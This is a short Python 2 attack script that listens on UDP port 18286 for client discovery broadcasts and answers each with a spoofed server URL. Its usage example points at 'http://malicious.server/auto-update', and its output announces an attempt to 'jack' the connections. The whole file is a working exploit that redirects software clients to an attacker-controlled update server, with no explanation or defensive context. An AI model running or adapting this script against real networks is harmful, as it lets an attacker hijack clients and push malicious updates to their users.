#!/usr/bin/python
import sys
import socket

if "http" not in sys.argv[1]:
    print "Usage: ", sys.argv[0], "http://malicious.server/auto-update"
    quit()

sURL="ServerURL=" + sys.argv[1]
LIP="0.0.0.0"
LPORT=18286

print "Attempting to jack broadcast connections to server:", sURL
sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP
sock.bind((LIP, LPORT))
while True:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
    print "received message:", data
    if "Client=" in data:
        print "sending message:", sURL
        sock.sendto(sURL, addr)
